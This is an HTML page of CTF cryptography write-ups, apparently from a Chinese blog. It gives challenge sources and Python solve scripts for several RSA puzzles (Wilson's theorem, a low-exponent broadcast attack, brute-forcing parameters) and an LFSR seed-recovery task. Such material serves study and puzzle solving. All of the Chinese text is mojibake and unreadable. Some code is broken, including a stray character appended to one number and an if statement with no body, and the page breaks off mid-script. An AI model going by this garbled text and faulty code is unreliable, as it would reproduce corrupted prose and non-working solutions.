<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…¬æ­£å…¬æ­£å…¬æ­£è¯šä¿¡æ–‡æ˜å…¬æ­£æ°‘ä¸»å…¬æ­£æ³•æ²»æ³•æ²»è¯šä¿¡æ°‘ä¸»è‡ªç”±æ•¬ä¸šå…¬æ­£å‹å–„å…¬æ­£å¹³ç­‰å¹³ç­‰æ³•æ²»æ°‘ä¸»å¹³ç­‰å¹³ç­‰å’Œè°æ•¬ä¸šè‡ªç”±è¯šä¿¡å¹³ç­‰å’Œè°å¹³ç­‰å…¬æ­£æ³•æ²»æ³•æ²»å¹³ç­‰å¹³ç­‰çˆ±å›½å’Œè°å…¬æ­£å¹³ç­‰æ•¬ä¸šå…¬æ­£æ•¬ä¸šè‡ªç”±æ•¬ä¸šå¹³ç­‰è‡ªç”±æ³•æ²»å’Œè°å¹³ç­‰æ–‡æ˜è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰å¯Œå¼ºå…¬æ­£æ•¬ä¸šå¹³ç­‰æ°‘ä¸»å…¬æ­£è¯šä¿¡å’Œè°å…¬æ­£æ–‡æ˜å…¬æ­£çˆ±å›½è‡ªç”±è¯šä¿¡è‡ªç”±å¹³ç­‰æ–‡æ˜å…¬æ­£è¯šä¿¡å¯Œå¼ºè‡ªç”±æ³•æ²»æ³•æ²»å¹³ç­‰å¹³ç­‰è‡ªç”±å¹³ç­‰å¯Œå¼ºæ³•æ²»è¯šä¿¡å’Œè°</span><br></pre></td></tr></table></figure>
<h3 id="é¢˜è§£-v2"><a class="header-anchor" href="#é¢˜è§£-v2">Â¶</a>é¢˜è§£</h3>
<p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚å¯†ç </p>
<p>åœ°å€ï¼š<a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a></p>
<h2 id="RoarCTF-2019-babyRSA"><a class="header-anchor" href="#RoarCTF-2019-babyRSA">Â¶</a>[RoarCTF 2019]babyRSA</h2>
<h3 id="é¢˜ç›®-v5"><a class="header-anchor" href="#é¢˜ç›®-v5">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sympy</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def myGetPrime():</span><br><span class="line">    A= getPrime(513)</span><br><span class="line">    print(A)</span><br><span class="line">    B=A-random.randint(1e3,1e5)</span><br><span class="line">    print(B)</span><br><span class="line">    return sympy.nextPrime((B!)%A)</span><br><span class="line">p=myGetPrime()</span><br><span class="line">#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span><br><span class="line">#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span><br><span class="line"></span><br><span class="line">q=myGetPrime()</span><br><span class="line">#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span><br><span class="line">#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span><br><span class="line"></span><br><span class="line">r=myGetPrime()</span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line">#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span><br><span class="line">c=pow(flag,e,n)</span><br><span class="line">#e=0x1001</span><br><span class="line">#c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span><br><span class="line">#so,what is the flag?</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h3>
<p>åˆ©ç”¨å¨å°”é€Šå®šç†ï¼š å½“pä¸ºç´ æ•°æ—¶$(p-1)\equiv-1(mod p)$<br>
æ¨å¯¼ï¼š<br>
<img src="http://static.zybuluo.com/hgggg/4n1v84bvw38qojece68x80ly/IMG20211012123645.jpg" alt="IMG20211012123645.jpg-3324.9kB"></p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A1=<span class="number">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class="line">B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596a</span><br><span class="line"></span><br><span class="line">A2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class="line">B2=<span class="number">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n=<span class="number">85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class="line">e=<span class="number">0x1001</span></span><br><span class="line">c=<span class="number">75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">A,B</span>):</span></span><br><span class="line">    ans=<span class="number">1</span></span><br><span class="line">    a=-<span class="number">1</span>%A</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(B+<span class="number">1</span>,A):</span><br><span class="line">        ans=(ans*invert(i,A))%A</span><br><span class="line">    <span class="keyword">return</span> next_prime((ans*a)%A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = de(A1,B1)</span><br><span class="line">q = de(A2,B2)</span><br><span class="line"></span><br><span class="line">r = n // p // q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<h2 id="é¹¤åŸæ¯-2021-Crazy-Rsa-Tech"><a class="header-anchor" href="#é¹¤åŸæ¯-2021-Crazy-Rsa-Tech">Â¶</a>[é¹¤åŸæ¯ 2021]Crazy_Rsa_Tech</h2>
<h3 id="é¢˜ç›®-v6"><a class="header-anchor" href="#é¢˜ç›®-v6">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FLAG = bytes_to_long(pad(<span class="string">b&quot;flag&#123;??????&#125;&quot;</span>,<span class="number">64</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_key</span>():</span></span><br><span class="line">    p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">    n = p*q</span><br><span class="line">    e = <span class="number">9</span></span><br><span class="line">    <span class="keyword">while</span>(GCD((p-<span class="number">1</span>)*(q-<span class="number">1</span>),e)!=<span class="number">1</span>):</span><br><span class="line">        p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">        n = p*q</span><br><span class="line">    d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> n,e,d</span><br><span class="line"></span><br><span class="line">n_list=<span class="built_in">list</span>()</span><br><span class="line">c_list=<span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    N,e,d=init_key()</span><br><span class="line">    n_list.append(N)</span><br><span class="line">    c=<span class="built_in">pow</span>(FLAG,e,N)</span><br><span class="line">    c_list.append(<span class="built_in">pow</span>(FLAG,e,N))</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(c,d,N)==FLAG)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n_list:&quot;</span>,n_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c_list:&quot;</span>,c_list)</span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-v4"><a class="header-anchor" href="#åˆ†æ-v4">Â¶</a>åˆ†æ</h3>
<p>ç»™äº†å¤šç»„Nï¼ŒC ä¸”e=9,ç›´æ¥RSAä½åŠ å¯†æŒ‡æ•°å¹¿æ’­æ”»å‡»</p>
<h3 id="exp-v4"><a class="header-anchor" href="#exp-v4">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">9</span></span><br><span class="line">N = [<span class="number">71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799</span>, <span class="number">92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949</span>, <span class="number">100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919</span>, <span class="number">59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847</span>, <span class="number">66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147</span>, <span class="number">120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377</span>, <span class="number">72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281</span>, <span class="number">69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951</span>, <span class="number">76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581</span>]</span><br><span class="line">C =  [<span class="number">62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585</span>, <span class="number">46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900</span>, <span class="number">85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198</span>, <span class="number">14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656</span>, <span class="number">1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839</span>, <span class="number">2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981</span>, <span class="number">16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376</span>, <span class="number">31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996</span>, <span class="number">25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515</span>]</span><br><span class="line"></span><br><span class="line">resultant, mod = crt(N,C)</span><br><span class="line">value, is_perfect = iroot(resultant,e)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(value))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RoarCTF-2019-RSA"><a class="header-anchor" href="#RoarCTF-2019-RSA">Â¶</a>[RoarCTF 2019]RSA</h2>
<h3 id="é¢˜ç›®-v7"><a class="header-anchor" href="#é¢˜ç›®-v7">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A=(((y%x)**<span class="number">5</span>)%(x%y))**<span class="number">2019</span>+y**<span class="number">316</span>+(y+<span class="number">1</span>)/x</span><br><span class="line">p=next_prime(z*x*y)</span><br><span class="line">q=next_prime(z)</span><br><span class="line">A =  <span class="number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span></span><br><span class="line">n =  <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c =  <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="åˆ†æ-v5"><a class="header-anchor" href="#åˆ†æ-v5">Â¶</a>åˆ†æ</h3>
<p>$A=(((y % x)^5)%(x % y))<sup>{2019}+y</sup>{316}+(y+1)/x$</p>
<p>å·²çŸ¥Açš„å€¼å¯ä»¥çˆ†ç ´å‡º x,y</p>
<p>åˆå·²çŸ¥<br>
$p\approx x * y * z$<br>
$q \approx z$<br>
æ‰€ä»¥å¯å¾—<br>
$q^2 \approx \frac{n}{x*y}\qquad$</p>
<p>å¾—åˆ°p,q å å°±å¯ä»¥çˆ†ç ´eæ¥å¾—åˆ°flag</p>
<h3 id="exp-v5"><a class="header-anchor" href="#exp-v5">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>  gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x</span></span><br><span class="line"><span class="comment">#p=next_prime(z*x*y)</span></span><br><span class="line"><span class="comment">#q=next_prime(z)</span></span><br><span class="line"></span><br><span class="line">A =  <span class="number">2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724</span></span><br><span class="line">n =  <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line">c =  <span class="number">41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">   <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">       C=(y+<span class="number">1</span>)//x</span><br><span class="line">       D=x%y</span><br><span class="line">       <span class="keyword">if</span>(D!=<span class="number">0</span>):</span><br><span class="line">           f=(((y%x)**<span class="number">5</span>)%D)**<span class="number">2019</span>+y**<span class="number">316</span>+C</span><br><span class="line">       <span class="keyword">if</span>(f==A):</span><br><span class="line">           <span class="built_in">print</span>(x,y)</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line"><span class="comment">#x = 2</span></span><br><span class="line"><span class="comment">#y = 83</span></span><br><span class="line"></span><br><span class="line">n1 = n//<span class="number">166</span></span><br><span class="line">n1 = next_prime(n1)</span><br><span class="line"></span><br><span class="line">q1 = iroot(n1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = next_prime(q1)</span><br><span class="line">p = n // q</span><br><span class="line"><span class="built_in">print</span>(isPrime(p))</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100000</span>):</span><br><span class="line">    e = i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        d = invert(e,phi)</span><br><span class="line">        flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        flag = long_to_bytes(flag)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;CTF&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2018-oldstreamgame"><a class="header-anchor" href="#CISCN-2018-oldstreamgame">Â¶</a>[CISCN 2018]oldstreamgame</h2>
<h3 id="è€ƒç‚¹"><a class="header-anchor" href="#è€ƒç‚¹">Â¶</a>è€ƒç‚¹</h3>
<pre><code>lfsræ±‚åˆå§‹åŒ–seed
</code></pre>
<h3 id="é¢˜ç›®-v8"><a class="header-anchor" href="#é¢˜ç›®-v8">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag)==<span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lfsr</span>(<span class="params">R,mask</span>):</span></span><br><span class="line">    output = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    lastbit=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i!=<span class="number">0</span>:</span><br><span class="line">        lastbit^=(i&amp;<span class="number">1</span>)</span><br><span class="line">        i=i&gt;&gt;<span class="number">1</span></span><br><span class="line">    output^=lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line">R=<span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">mask = <span class="number">0b10100100000010000000100010010100</span></span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        (R,out)=lfsr(R,mask)</span><br><span class="line">        tmp=(tmp &lt;&lt; <span class="number">1</span>)^out</span><br><span class="line">    f.write(<span class="built_in">chr</span>(tmp))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<h3 id="exp-v6"><a class="header-anchor" href="#exp-v6">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mask=0b10100100000010000000100010010100 #0,2,5,12,20,24,27,29</span></span><br><span class="line">c = <span class="string">&#x27;00100000111111011110111011111000&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">c</span>):</span></span><br><span class="line">    li=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        temp=<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(li)+c[:<span class="number">31</span>-<span class="built_in">len</span>(li)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(temp[<span class="number">0</span>])^<span class="built_in">int</span>(temp[<span class="number">2</span>])^<span class="built_in">int</span>(temp[<span class="number">5</span>])^<span class="built_in">int</span>(temp[<span class="number">12</span>])^<span class="built_in">int</span>(temp[<span class="number">20</span>])^<span class="built_in">int</span>(temp[<span class="number">24</span>])^<span class="built_in">int</span>(temp[<span class="number">27</span>])^<span class="built_in">int</span>(temp[<span class="number">29</span>])==<span class="built_in">int</span>(c[<span class="number">31</span>-<span class="built_in">len</span>(li)]):</span><br><span class="line">         </span><br><span class="line">            li.insert(<span class="number">0</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            </span><br><span class="line">            li.insert(<span class="number">0</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line">flag=solve(c)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">eval</span>(<span class="string">&#x27;0b&#x27;</span>+<span class="string">&#x27;&#x27;</span>.join(flag))))</span><br></pre></td></tr></table></figure>
<h2 id="é•¿å®‰æ¯-2021-checkin"><a class="header-anchor" href="#é•¿å®‰æ¯-2021-checkin">Â¶</a>[é•¿å®‰æ¯ 2021]checkin</h2>
<h3 id="é¢˜ç›®è€ƒç‚¹"><a class="header-anchor" href="#é¢˜ç›®è€ƒç‚¹">Â¶</a>é¢˜ç›®è€ƒç‚¹</h3>
<pre><code>1.RSA
2.å¨å°”é€Šå®šç†
</code></pre>
<h3 id="é¢˜ç›®-v9"><a class="header-anchor" href="#é¢˜ç›®-v9">Â¶</a>é¢˜ç›®</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">16</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p-q):</span><br><span class="line">    m = m*i%n</span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(<span class="number">2</span>,e,n))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n))</span><br><span class="line"><span class="comment">#4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line"><span class="comment">#3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br></pre></td></tr></table></figure>
<h3 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h3>
<p>å¯ä»¥ç”¨$2^e-c1$å¾—åˆ°kn,ç„¶ååˆ†ä¸€ç›´qä¸º16ä½çš„è´¨æ•°çˆ†ç ´å¾—åˆ°q,æœ€ååˆ†è§£kpå¾—åˆ°p</p>
<p>åˆ©ç”¨å¨å°”é€Šå®šç†æ±‚å¾—(p-q-1)çš„é˜¶ä¹˜åè®¡ç®—å‡ºm</p>
<h3 id="exp-v7"><a class="header-anchor" href="#exp-v7">Â¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line">c2 = <span class="number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">1049</span></span><br><span class="line">kn = <span class="number">2</span>**e - c1</span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> kn % i == <span class="number">0</span> <span class="keyword">and</span> isPrime(i):</span><br><span class="line"></span><br><span class="line">kp = kn // q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">yaf</span>(<span class="params">kp</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span> kp % i == <span class="number">0</span>:</span><br><span class="line">            p = kp // i</span><br><span class="line">            <span class="keyword">if</span> isPrime(p):</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line">            <span 